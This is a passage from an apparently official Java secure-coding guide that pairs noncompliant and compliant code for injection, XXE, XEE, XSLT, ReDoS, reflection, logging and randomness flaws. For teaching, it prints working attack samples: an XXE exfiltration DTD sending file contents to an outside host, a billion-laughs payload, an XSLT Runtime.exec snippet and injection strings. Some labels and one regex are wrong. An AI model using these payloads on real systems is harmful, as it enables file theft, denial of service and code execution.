    String userName = request.getParameter("name");
    String password = request.getParameter("password");
    ... //Ensure that the lengths of userName and password are valid
    String sqlStr = "SELECT * FROM t_user_info WHERE name=? AND password =?";
    stmt = connection.prepareStatement(sqlStr);
    stmt.setString(1, userName);
    stmt.setString(2, password);
    rs = stmt.executeQuery();
    ... //Handle the result set
} catch (SQLException ex) {
    //Handle the exception
}
```

In parameterized query, placeholders are used to represent parameter values required at execution time. In this way, the semantic logic of the SQL query is pre-defined, and the actual parameter value is determined at the execution time. Parameterized query helps databases distinguish semantic logic from parameters in SQL statements, ensuring that user input cannot change the expected semantic logic of the SQL query. If the attacker enters `zhangsan' OR 'a' = 'a` as the user name, the string is used only as the value of the **name** field.

**\[Compliant Code Example]** (Escaping the Input)

```java
public List<Book> queryBooks(List<Expression> queryCondition) {
    ...
    try {
        StringBuilder sb = new StringBuilder("select * from t_book where ");
        Codec oe = new OracleCodec();
        if (queryCondition != null && !queryCondition.isEmpty()) {
            for (Expression e : queryCondition) {
                String exprString = e.getColumn() + e.getOperator();
                String safeValue = XXXEncoder.encodeForSQL(oe, e.getValue());
                sb.append(exprString).append("'").append(safeValue).append("' and ");
            }
            sb.append("1=1");
            Statement stat = connection.createStatement();
            ResultSet rs = stat.executeQuery(sb.toString());
            ... //Other code
        }
    }
    ...
}
```

Although parameterized query is the most convenient and effective way to prevent SQL injection, it is not applicable to all scenarios, because not any part of an SQL statement can be replaced by a placeholder before execution. When an SQL statement is dynamically constructed using external data that cannot be replaced by placeholders before execution, the external data must be validated. Each DBMS has its own escape mechanism to tell the database that the input should be treated as data, not code logic. Therefore, as long as the input data is properly escaped, SQL injection will not occur.

**Note**: If the passed data is a field name or table name, trustlist validation is recommended.

Similar to concatenating parameters in program code, concatenating parameter values to create query strings in stored procedures also has SQL injection risks.

**\[Noncompliant Code Example]** (Dynamically Building SQL Statements in Stored Procedure)

SQL Server stored procedure:

```sql
CREATE PROCEDURE sp_queryItem
    @userName varchar(50),
    @password varchar(50)
AS
BEGIN
    DECLARE @sql nvarchar(500);
    SET @sql = 'SELECT * FROM t_user_info
                WHERE name= ''' + @userName + '''
                AND password= ''' + @password + '''';
    EXEC(@sql);
END
GO
```

Similar to concatenating parameters in program code, concatenating parameter values to create query strings in stored procedures also has SQL injection risks.

**\[Compliant Code Example]** (Parameterized Query in Stored Procedure)

SQL Server stored procedure:

```sql
CREATE PROCEDURE sp_queryItem
    @userName varchar(50),
    @password varchar(50)
AS
BEGIN
    SELECT * FROM t_user_info
    WHERE name = @userName
    AND password = @password;
END
GO
```

Use parameterized query in stored procedures and avoid insecure dynamic building of SQL statements. When compiling these stored procedures, the database will generate a SELECT query execution plan to allow only original SQL semantics to be executed and prohibit the execution of any parameter values, even injected SQL statements.

## Do not use external data to construct format strings

**\[Description]**

Format in Java can convert an object into a character string in a specified format. A format string controls the length, content, and style of the final character string. If the format specified in the format string does not match the format object, an exception may be thrown. An attacker who can directly control a format string can cause information leak, DoS, system functional anomalies, and other risks.

**\[Noncompliant Code Example]**

```java
public String formatInfo(String formatStr) {
    String value = getData();
    return String.format(formatStr, value));
}

String formatStr = req.getParameter("format");
String formattedValue = formatInfo(formatStr);
```

In this noncompliant code example, an externally specified format is used to format a character string. If the externally specified format is not a character type (for example, **%d**), an exception will occur during the format operation.

**\[Compliant Code Example]**

```java
public String formatInfo() {
    String value = getData();
    return String.format("my format: %s", value));
}
```

This compliant code example excludes user input from the format string.

## Do not pass external data to the **Runtime.exec()** method or **java.lang.ProcessBuilder** class

**\[Description]**

The `Runtime.exec()` method or `java.lang.ProcessBuilder` class is used to start a new process and execute commands in the new process. Directly executing a command constructed using external data, for example, `Runtime.getRuntime().exec("ping 127.0.0.1")`, may incur the following risks:

- The command to be executed is split using the command interpreter. In this mode, multiple commands can be executed, causing command injection risks.
- Parameters are injected into the command using spaces, double quotation marks, or strings starting **-/**, leading to parameter injection risks.

**Using external data to construct non-shell commands**

**\[Noncompliant Code Example]**

```java
String cmd = "ping" + ip;
Runtime rt = Runtime.getRuntime();
Process proc = rt.exec(cmd);
```

When the value of **ip** is **127.0.0.1 -t**, the **-t** parameter is injected into the executed command. As a result, the ping process is continuously executed.

The solutions to command injection or parameter injection are as follows:

1\. **Do not directly run the command**

To use the functions provided by standard Java libraries or open-source components, use the APIs of the libraries or components to avoid running commands.

If command execution is inevitable, validate and sanitize external data.

2\. **Validate external data**

**\[Compliant Code Example]** (Data Validation)

```java
...
//The str value comes from the user input
if (!Pattern.matches("[0-9A-Za-z@]+", str)) {
    //Handle the error
}
...
```

When external data is used to concatenate commands, validate external data using a trustlist and exclude special characters that may incur injection risks.

3\. **Escape external data**

**\[Compliant Code Example]** (Escape)

```java
String encodeIp = XXXXEncoder.encodeForOS(new WindowsCodec(), ip);
String cmd = "cmd.exe /c ping " + encodeIp;
Runtime rt = Runtime.getRuntime();
Process proc = rt.exec(cmd);
...
```

If risky special characters cannot be avoided through input validation during command execution, the external input must be escaped. Using escaped fields to concatenate commands can effectively prevent command injection.

Remarks: The correct practice is to escape only external input, but not the entire concatenated command. The escape method can effectively prevent command injection, but not parameter injection.

## Do not directly use external data to concatenate XML

**\[Description]**

Using unverified data to construct XML will result in XML injection vulnerabilities. If users are allowed to enter structured XML segments, they can inject XML tags into the XML data domain to rewrite the structure and content of the target XML file. These tags are identified and interpreted by the XML parser and may cause XML injection.

**\[Noncompliant Code Example]**

```java
private void createXMLStream(BufferedOutputStream outStream, User user)
    throws IOException {
    String xmlString;
    xmlString = "<user><role>operator</role><id>" + user.getUserId()
        + "</id><description>" + user.getDescription() + "</description></user>";
    ... //Parse the XML string
}
```

An ill-intentioned user may use the following string as the user ID:

```
"joe</id><role>administrator</role><id>joe"

```

And enter the following normal input in the description field:

```
"I want to be an administrator"

```

Eventually, the entire XML string becomes the following:

```xml
<user>
    <role>operator</role>
    <id>joe</id>
    <role>administrator</role>
    <id>joe</id>
    <description>I want to be an administrator</description>
</user>
```

The SAX parser (org.xml.sax and javax.xml.parsers.SAXParser) overwrites the value of the second **role** field when interpreting the XML file. As a result, the user is escalated from an operator to an administrator.

**\[Noncompliant Code Example]** (XML Schema or DTD Validation)

```java
private void createXMLStream(BufferedOutputStream outStream, User user)
    throws IOException {
    String xmlString;
    xmlString = "<user><id>" + user.getUserId()
        + "</id><role>operator</role><description>" + user.getDescription()
        + "</description></user>";

    StreamSource xmlStream = new StreamSource(new StringReader(xmlString));

    //Create an SAX parser that uses the schema to perform validation
    SchemaFactory sf = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
    StreamSource ss = new StreamSource(new File("schema.xsd"));
    try {
        Schema schema = sf.newSchema(ss);
        Validator validator = schema.newValidator();
        validator.validate(xmlStream);
    } catch (SAXException ex) {
        throw new IOException("Invalid userId", ex);
    }

    //The XML is valid and is processed
    outStream.write(xmlString.getBytes(StandardCharsets.UTF_8));
    outStream.flush();
}
```

The schema definition in the **schema.xsd** file is as follows:

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
    <xs:element name="user">
        <xs:complexType>
        <xs:sequence>
            <xs:element name="id" type="xs:string"/>
            <xs:element name="role" type="xs:string"/>
            <xs:element name="description" type="xs:string"/>
        </xs:sequence>
        </xs:complexType>
    </xs:element>
</xs:schema>
```

An ill-intentioned user may use the following string as the user ID:

```
"joe</id><role>Administrator</role><!--"

```

And enter the following string in the description field:

```
"--><description>I want to be an administrator"

```

Eventually, the entire XML string becomes the following:

```xml
<user>
    <id>joe</id>
    <role>Administrator</role><!--</id> <role>operator</role> <description> -->
    <description>I want to be an administrator</description>
</user>
```

The `<!--` at the end of the user ID and the `-->` at the beginning of the description field will comment out the role information hard coded in the XML string. Although the user role has been changed to the administrator by an attacker, the entire XML string can still be verified by the schema. XML schema or DTD validation ensures that the XML format is valid, but attackers can tamper with the XML content without breaking the original XML format.

**\[Compliant Code Example]** (Trustlist Validation)

```java
private void createXMLStream(BufferedOutputStream outStream, User user)
    throws IOException {
    //Write the XML string only when the user ID contains only letters, digits, and underscores (_)
    if (!Pattern.matches("[_a-bA-B0-9]+", user.getUserId())) {
        //Handle the error
    }
    if (!Pattern.matches("[_a-bA-B0-9]+", user.getDescription())) {
        //Handle the error
    }
    String xmlString = "<user><id>" + user.getUserId()
        + "</id><role>operator</role><description>"
        + user.getDescription() + "</description></user>";
    outStream.write(xmlString.getBytes(StandardCharsets.UTF_8));
    outStream.flush();
}
```

The trustlist validation ensures that the user ID contains only letters, digits, and underscores (\_)

**\[Compliant Code Example]** (Using a Secure XML Library)

```java
public static void  buildXML(FileWriter writer, User user) throws IOException {
    Document userDoc = DocumentHelper.createDocument();
    Element userElem = userDoc.addElement("user");
    Element idElem = userElem.addElement("id");
    idElem.setText(user.getUserId());
    Element roleElem = userElem.addElement("role");
    roleElem.setText("operator");
    Element descrElem = userElem.addElement("description");
    descrElem.setText(user.getDescription());
    XMLWriter output = null;
    try {
        OutputFormat format = OutputFormat.createPrettyPrint();
        format.setEncoding("UTF-8");
        output = new XMLWriter(writer, format);
        output.write(userDoc);
        output.flush();
    } finally {
        //Close the stream
    }
}
```

This compliant code example uses Dom4j, a well-defined, open-source XML tool library, to construct XML. Dom4j will encode the text data field in XML format to protect the original structure and format of the XML from damage.

In this example, if the attacker enters the following string as the user ID:

```
"joe</id><role>Administrator</role><!--"

```

And enter the following string in the description field:

```
"--><description>I want to be an administrator"

```

The generated XML will take the following format:

```xml
<user>
    <id>joe&lt;/id&gt;&lt;role&gt;Administrator&lt;/role&gt;&lt;!--</id>
    <role>operator</role>
    <description>--&gt;&lt;description&gt;I want to be an administrator</description>
</user>
```

As shown above, **\<** and **>** are replaced with **\&lt;** and **\&gt;** respectively after XML encoding. As a result, the attacker fails to escalate from an operator to an administrator.

**\[Compliant Code Example]** (Encoding)

```java
private void createXMLStream(BufferedOutputStream outStream, User user)
    throws IOException {
    ...
    String encodeUserId = XXXXEncoder.encodeForXML(user.getUserId());
    String encodeDec = XXXXEncoder.encodeForXML(user.getDescription());

    String xmlString = "<user><id>" + encodeUserId
        + "</id><role>operator</role><description>" + encodeDec
        + "</description></user>";
    outStream.write(xmlString.getBytes(StandardCharsets.UTF_8));
    outStream.flush();
}
```

In this compliant code example, external data is encoded before the XML string is concatenated, to prevent tampering with the XML string structure.

## Prevent XML External Entity (XXE) attacks caused by parsing external XML

**\[Description]**

XML entities include internal and external entities. An external entity takes the format of `<!ENTITY SYSTEM "URI"\>` or `<!ENTITY PUBLIC "public_ID" "URI"\>`. In Java, protocols that introduce external entities include HTTP, HTTPS, FTP, file, JAR, netdoc, and mailto. The XXE vulnerability occurs when an application parses external XML data or files without forbidding the loading of external entities, causing arbitrary file reading, intranet port scanning, intranet website attacks, DoS, and other attacks.

1\. Use the external entity reference function to read arbitrary files:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE updateProfile [
    <!ENTITY file SYSTEM "file:///c:/xxx/xxx.ini"> ]>
<updateProfile>
    <firstname>Joe</firstname>
    <lastname>&file;</lastname>
    ...
</updateProfile>
```

2\. Use parameter entities and **\<CDATA\[]>** to avoid XML parsing syntax errors and the parsing of malicious entities.

XML file: Construct the parameter entities **% start**, **% goodies**, **% end**, and **% dtd** to define a malicious **combine.dtd**.

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % goodies SYSTEM "file:///etc/fstab">
    <!ENTITY % end "]]>">
    <!ENTITY % dtd SYSTEM "http://evil.example.com/combine.dtd">
    %dtd;
    ]>
<roottag>&all;</roottag>
```

Define the **\&all** entity in the malicious DTD **combine.dtd**.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY all "%start;%goodies;%end;">
```

An ill-intentioned user can even construct a malicious **combine.dtd** to send the result to the destination address and finally obtain the **file:///etc/fstab** file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % send "<!ENTITY all SYSTEM 'http://mywebsite.com/?%gooddies;'>">
%send;
```

**\[Noncompliant Code Example]**

In this example, an external XML file is parsed. The parsing of DTDs or external entities is not disabled.

```java
private void parseXmlFile(String filePath) {
    try {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(new File(filePath));
        ... //Parse the XML file
    } catch (ParserConfigurationException ex) {
        //Handle the exception
    }
    ...
}
```

This noncompliant code example does not provide security protection for XML parsing. When the XML file is crafted by an attacker, the system is vulnerable to XXE attacks.

**\[Complaint Code Example]** (Disabling DTD Parsing)

```java
private void parserXmlFileDisableDtds(String filePath) {
    try {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(new File(filePath));
        ... //Parse the XML file
    } catch (ParserConfigurationException ex) {
        //Handle the exception
    }
    ...
}
```

The compliant code example disables the parsing of DTDs, which can prevent both XXE and internal entity attacks.

**\[Compliant Code Example]** (Disabling the Parsing of External General Entities and Parameter Entities)

This compliant code example can prevent XXE attacks but not XML internal entity attacks.

```java
private void parserXmlFileDisableExternalEntityes(String filePath) {
    try {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", false);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(new File(filePath));
        ... //Parse the XML file
    } catch (ParserConfigurationException ex) {
        //Handle the exception
    }
    ...
}
```

**\[Compliant Code Example]** (Trustlist Validation on External Entities)

The compliant code example defines a **CustomResolver** class to implement interface `org.xml.sax.EntityResolver`. A customized mechanism for processing external entities is implemented in this class. The customized entity parsing method uses a simple trustlist for validation. If a match is found in the trustlist, the corresponding file content is returned; if no match is found, the returned result is empty.

```java
private static void parserXmlFileValidateEntities(String filePath) {
    try {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();
        db.setEntityResolver(new ValidateEntityResolver());
        Document doc = db.parse(new File(filePath));
        ... //Parse the XML file
    } catch (ParserConfigurationException ex) {
        //Handle the exception
    }
    ...
}

class ValidateEntityResolver implements EntityResolver {
    private static final String GOOD_ENTITY = "file:/Users/onlinestore/good.xml";

    public InputSource resolveEntity(String publicId, String systemId)
        throws SAXException, IOException {
        if (publicId != null && publicId.equals(GOOD_ENTITY)) {
            return new InputSource(publicId);
        } else if (systemId != null && systemId.equals(GOOD_ENTITY)) {
            return new InputSource(systemId);
        } else {
            return new InputSource();
        }
    }
}
```

If external entities must be used in XML operations in the system, the external entities must be validated against the trustlist. As shown in the above example, a `ValidateEntityResolver` class is customized (with implementation interface `org.xml.sax.EntityResolver`) to validate XXEs using the `resolveEntity` method. XXEs not in the trustlist are not parsed.

Remarks: The XML parser used above is only an example. When a program loads external XML data, you can disable the parsing of external entities by setting attributes or other methods that take effect on the parser, and construct malicious XML content as shown in the above example to check the program response, so as to determine whether the set attributes take effect.

## Prevent XML Entity Expansion (XEE) attacks caused by parsing external XML

**\[Description]**

The content of XML internal entities has been declared in Doctype. An internal entity takes the format of or `<!ENTITY "ENTITY VALUE"\>`. XEE attack is a common internal entity attack. It mainly attempts to consume the server memory resources of the target program to cause DoS attacks. XXE and XEE attacks have different protection measures (disabling DTD parsing can prevent both).

Parsing the malicious internal entity in the following example occupies many server memory resources, causing DoS attacks.

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
<lolz>&lol9;</lolz>
```

**Disabling DTD parsing is the best method to protect** against XEE attacks. You can also limit the number of internal entities to reduce the possibility of XEE attacks. If internal entities are not required, disable DTD parsing. If internal entities are required, strictly limit the number of internal entities and the size of XML content.

**\[Complaint Code Example]** (Disabling DTD Parsing)

```java
public void receiveXMLStream(InputStream inStream)
    throws ParserConfigurationException, SAXException, IOException {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    DocumentBuilder db = dbf.newDocumentBuilder();
    db.parse(inStream);
}
```

**\[Compliant Code Example]** (Limiting the Number of Internal Entities to Be Parsed)

The default maximum number of entities to be parsed by the JAXP parser in Java is 64,000, while fewer entities need to be parsed by the JAXP parser in fact. Therefore, we can set a smaller number. The following code example limits the number of entities to be parsed by setting the attributes of the DOM parser.

```java
public void receiveXMLStream(InputStream inStream)
    throws ParserConfigurationException, SAXException, IOException {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setAttribute("http://www.oracle.com/xml/jaxp/properties/entityExpansionLimit",
        "200");
    DocumentBuilder db = dbf.newDocumentBuilder();
    db.parse(inStream);
}
```

Remarks: The **http://www.oracle.com/xml/jaxp/properties/entityExpansionLimit** attribute is supported in JDK 7u45+ and JDK 8. The SAX and StAX parsers in JAXP do not support this attribute.

**\[Compliant Code Example]** (Limiting the Number of Internal Entities to Be Parsed)

The following code example limits the number of entities to be parsed by setting system attributes.

```java
public void receiveXMLStream(InputStream inStream)
    throws ParserConfigurationException, SAXException, IOException {

    //Use system attributes to limit the number of entities
    System.setProperty("entityExpansionLimit", "200");
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    DocumentBuilder db = dbf.newDocumentBuilder();
    db.parse(inStream);
}
```

Remarks: The **entityExpansionLimit** attribute is supported in JDK 7u45+ and JDK 8. This method is effective in both SAX and StAX parsers in JAXP.

Some products use the DOM, SAX, and StAX parsers provided by the Xerces third-party JAR package, where you can set `setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true)` to limit the number of entities to be no more than 100,000.

**\[Compliant Code Example]** (Limiting the Number of Internal Entities to Be Parsed)

This compliant code example limits the number of parsed entities in the Xerces package.

```java
private static void receiveXMLStream(InputStream inStream)
    throws ParserConfigurationException, SAXException, IOException {
    DocumentBuilderFactory factory = DocumentBuilderFactoryImpl.newInstance();
    factory.setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true);
    DocumentBuilder db = factory.newDocumentBuilder();
    org.w3c.dom.Document doc = db.parse(inStream);
    doc.getChildNodes();
}
```

Remarks: The XML parser used above is only an example. When a program loads external XML data, you can disable the parsing of internal entities by setting attributes or other methods that take effect on the parser, and construct malicious XML content as shown in the above example to check the program response, so as to determine whether the set attributes take effect.

## Do not use insecure XSLT to convert XML files

**\[Description]**

Extensible stylesheet language transformation (XSLT) can convert XML data into other XML format or other formats such as HTML and pure text. XSLT can be exploited to execute arbitrary code. Therefore, when **TransformerFactory** is used to convert XML data, security policies need to be added to prevent insecure XSLT code execution.

**\[Noncompliant Code Example]**

```java
public void XsltTrans(String src, String dst, String xslt) {
    //Obtain the transformer factory
    TransformerFactory tf = TransformerFactory.newInstance();
    try {
        //Obtain the transformer object instance
        Transformer transformer = tf.newTransformer(new StreamSource(xslt));

        //Carry out transformation
        transformer.transform(new StreamSource(src),
            new StreamResult(new FileOutputStream(dst)));
        ...
    } catch (TransformerException ex) {
        //Handle the exception
    }
    ...
}
```

In this example, XSLT is not restricted and is called directly. When XSLT code resembling the following is executed, command execution vulnerabilities may occur:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="java">
    <xsl:template match="/" xmlns:os="java:lang.Runtime" >
        <xsl:variable name="runtime" select="java:lang.Runtime.getRuntime()"/>
        <xsl:value-of select="os:exec($runtime, 'calc')" />
    </xsl:template>
</xsl:stylesheet>
```

**\[Compliant Code Example]**

```java
public void xsltTrans(String src, String dst, String xslt) {
    //Obtain the transformer factory
    TransformerFactory tf = TransformerFactory.newInstance();
    try {
        //Set a blocklist for the transformer factory to prohibit some insecure methods, which is similar to XXE protection
        tf.setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true);

        //Obtain the transformer object instance
        Transformer transformer = tf.newTransformer(new StreamSource(xslt));

        //Remove <?xml version="1.0" encoding="UTF-8"?>
        transformer.setOutputProperty("omit-xml-declaration", "yes");

        //Carry out transformation
        transformer.transform(new StreamSource(src),
            new StreamResult(new FileOutputStream(dst)));
        ...
    } catch (TransformerException ex) {
        //Handle the exception
    }
    ...
}
```

A security policy can be added to **TransformerFactory**. Java has a built-in blocklist for XSLT. Here some insecure methods are disabled by setting **http://javax.xml.XMLConstants/feature/secure-processing** to **true**.

## Try best to simplify the regular expression (regex) to prevent regular expression denial of service (ReDoS) attacks

**\[Description]**

ReDoS attacks are common security risks caused by inappropriate regexes. The NFA engine is used for regex matching in Java. Due to the backtracking mechanism of the NFA engine, the time consumed when a regex is not matched is longer than the time consumed when the regex is matched. That's because the regex needs to be matched against all possible paths before a mismatch is determined and a failure is returned. ReDoS attacks rarely occur when a simple regex without groups is used. The following types of regexes are vulnerable to ReDoS attacks:

1\. Regexes containing self-repeating groups, for example: 

`^(\d+)+$`

 `^(\d*)*$`

 `^(\d+)*$`

 `^(\d+|\s+)*$`

2\. Regexes containing repetitive groups with replacement, for example:

`^(\d|\d|\d)+$` 

`^(\d|\d?)+$`

Measures for defending against ReDoS attacks are as follows:

- Check the text length before regex matching.
- Avoid using complex regexes and minimize groups. Take `^(([a-z])+\.)+[A-Z]([a-z])+$` (which has the ReDoS risk) as an example. You can delete the redundant group `^([a-z]+\.)+[A-Z][a-z]+$` without altering the check rule, eliminating the ReDoS risk.
- Do not dynamically construct regexes. Implement strict trustlist validation when using external data to construct regexes.

**\[Noncompliant Code Example]**

```java
private static final Pattern REGEX_PATTER = Pattern.compile("a(b|c+)+d");

public static void main(String[] args) {
    ...
    Matcher matcher = REGEX_PATTER.matcher(args[0]);
    if (matcher.matches()) {
        ...
    } else {
        ...
    }
    ...
}
```

This noncompliant code example uses the `a(b|c+)+d` regex which has the ReDoS risk. When the matched string resembles **accccccccccccccccx**, the code execution time sees exponential growth with the increase in the number of **c** characters.

**\[Compliant Code Example]**

```java
private static final Pattern REGEX_PATTER = Pattern.compile("a[bc]+d");

public static void main(String[] args) {
    ...
    Matcher matcher = REGEX_PATTER.matcher(args[0]);
    if (matcher.matches()) {
        ...
    } else {
        ...
    }
    ...
}
```

This compliant code example simplifies the regex into `a[bc]+d` without changing the function, eliminating the ReDoS risk.

**\[Noncompliant Code Example]**

```java
String key = request.getParameter("keyword");
...
String regex = "[a-zA-Z0-9_-]+@" + key + "\\.com";
Pattern searchPattern = Pattern.compile(regex);
...
```

This noncompliant code example uses the keyword specified by an external input source to construct the regex. The ReDoS risk may occur when the keyword contains repetitive groups. Therefore, during code development, do not use external data directly as regexes or to construct regexes.

## Do not use external data directly as the class or method name in the reflection operation

**\[Description]**

Using external data as the class or method name in the reflection operation can lead to an unexpected logic process, that is, unsafe reflection. This can be exploited by ill-intentioned users to bypass security checks or execute arbitrary code. If external data is required for reflection operations, the data must be validated against a class or method trustlist. Besides, the program could also allow users to select classes or methods in a given scope to protect reflection operations.

**\[Noncompliant Code Example]**

```java
String className = request.getParameter("class");
...
Class objClass = Class.forName(className);
BaseClass obj = (BaseClass) objClass.newInstance();
obj.doSomething();
```

This noncompliant code example uses an external class name to directly construct an object through reflection. An ill-intentioned user can construct a malicious `BaseClass` subclass object, take control over a `BaseClass` subclass, and execute arbitrary code in the `doSomething()` method of the subclass. An ill-intentioned user can further use the code to execute the default constructor of any class. Even if a `ClassCastException` is thrown in class conversion, the code in the constructor is executed as expected by the ill-intentioned user.

**\[Compliant Code Example]**

```java
String classIndex = request.getParameter("classIndex");
String className = (String) reflectClassesMap.get(classIndex);
if (className != null) {
    Class objClass = Class.forName(className);
    BaseClass obj = (BaseClass) objClass.newInstance();
    obj.doSomething();
} else {
    throw new IllegalStateException("Invalid reflect class!");
}
...
```

In this compliant code example, an external user can only specify the class index. If this class index can be mapped to a class name, the reflection operation is performed; if not, the program considers it invalid.

# Log Auditing

#### Do not log external data

**\[Description]**

Recording external data into logs may incur the following risks:

- Log injection: Ill-intentioned users can use characters such as carriage returns and line feeds to inject a complete log.
- Leak of sensitive information: Recording user-supplied sensitive information into logs may leak the sensitive information.
- Junk log or log overwriting: If a user enters very long strings, a large number of junk logs may be generated. If logs are cyclically overwritten, valid logs may be maliciously overwritten.

Therefore, do not record external data in logs. If external data must be logged, validate and sanitize the external data and truncate long strings. Before being recorded in logs, sensitive data such as keys and passwords must be masked with a fixed number of asterisks (\*), and other sensitive data, such as mobile numbers and email addresses, need to be anonymized.

**\[Noncompliant Code Example]**

```java
String jsonData = getRequestBodyData(request);
if (!validateRequestData(jsonData)) {
    LOG.error("Request data validate fail! Request Data : " + jsonData);
}
```

In this noncompliant code example, the requested JSON data will be directly logged when the validation fails. Sensitive data, if any, in the JSON string may be leaked. An ill-intentioned user can use carriage returns and line feeds to inject a crafted log into the JSON string. A long JSON string can lead to redundant logs.

**\[Compliant Code Example]**

Newline characters, such as **\\r\\n** in external data, could be replaced before being recorded in logs to prevent log injection. The following code example shows a compliant implementation:

```java
public String replaceCRLF(String message) {
    if (message == null) {
        return "";
    }
    return message.replace('\n', '_').replace('\r', '_');
}
```

#### Do not log sensitive information such as passwords and keys

**\[Description]**

Sensitive data, such as passwords and keys as well as their ciphertext forms, shall not be recorded in logs. Otherwise, the sensitive data may be leaked. If such data is absolutely needed in logs, replace it with a fixed number of asterisks (\*).

**\[Noncompliant Code Example]**

```java
private static final Logger LOGGER = Logger.getLogger(TestCase1.class);
...
LOGGER.info("Login success, user is " + userName + ", password is " +
    encrypt(pwd.getBytes(StandardCharsets.UTF_8)));
```

**\[Compliant Code Example]**

```java
private static final Logger LOGGER = Logger.getLogger(TestCase1.class);
...
LOGGER.info("Login success, user is " + userName + ", password is ********.");
```

# Performance and Resource Management

#### Release resources in **try-with-resource** or **finally** during I/O operations

**\[Description]**

Resources need to be released in a timely manner when they are no longer needed. However, when exceptions occur, resource release is often ignored. This requires explicitly use of `close()` or another method in the **finally** block of the **try-catch-finally** structure to release resources during database and I/O operations. If multiple I/O objects need to be released using `close()`, each `close()` invocation must be done in a separate **try-catch** structure, so as to prevent a release failure of one I/O object from affecting the release of other I/O objects.

Java 7 provides the automatic resource management feature **try-with-resource**. It takes precedence over **try-finally**, so the resulting code is more concise and clear, and the resulting exceptions are more valuable. Especially for multiple resources or exceptions, **try-finally** may lose the previous exception, while **try-with-resource** retains the first exception and treats subsequent exceptions as suppressed exceptions, which can be checked based on the array returned by `getSuppressed()`.

**try-finally** is also used in scenarios such as `lock()` and `unlock()`.

**\[Compliant Code Example]**

```java
try (FileInputStream in = new FileInputStream(inputFileName);
    FileOutputStream out = new FileOutputStream(outputFileName)) {
    copy(in, out);
}
```

# Miscellaneous

#### Use cryptographically secure random numbers in security scenarios

**\[Description]**

Insecure random numbers may be partially or entirely predicted, causing security risks in the system. Therefore, cryptographically secure random numbers must be used in security scenarios. Cryptographic secure random numbers fall into two types:

- Random numbers generated by true random number generators (TRNGs).
- Random numbers generated by pseudo random number generators (PRNGs) which use the few random numbers generated by TRNGs as seeds

In Java, `SecureRandom` is a cryptographically secure PRNG. When using PRNGs to generate random numbers, make sure to use true random numbers as seeds.

Common security scenarios include:

- Generation of IVs, salts, keys, etc. for cryptographic algorithm purposes
- Generation of session IDs
- Generation of random numbers in the challenge algorithm
- Generation of random numbers of verification codes

**\[Noncompliant Code Example]**

```java
public byte[] generateSalt() {
    byte[] salt = new byte[8];
    Random random = new Random(123456L);
    random.nextBytes(salt);
    return salt;
}
```

`Random` only generates insecure random numbers, which cannot be used as salts.

**\[Noncompliant Code Example]**

```java
public byte[] generateSalt() {
    byte[] salt = new byte[8];
    SecureRandom random = new SecureRandom();
    random.nextBytes(salt);
    return salt;
}
```

#### Use SSLSocket, but not Socket, for secure data exchange

**\[Description]**

Programs must use SSLSocket, but not Socket, for network communications involving cleartext sensitive information. Socket provides cleartext communication wherein the sensitive data may be intercepted by attackers, so that the attackers can launch man-in-the-middle attacks to tamper with packets. SSLSocket provides security protection on the basis of Socket, such as identity authentication, data encryption, and integrity protection.

**\[Noncompliant Code Example]**

```java
try {
    Socket socket = new Socket();
    socket.connect(new InetSocketAddress(ip, port), 10000);
    os = socket.getOutputStream();
    os.write(userInfo.getBytes(StandardCharsets.UTF_8));
    ...
} catch (IOException ex) {
    //Handle the exception
} finally {
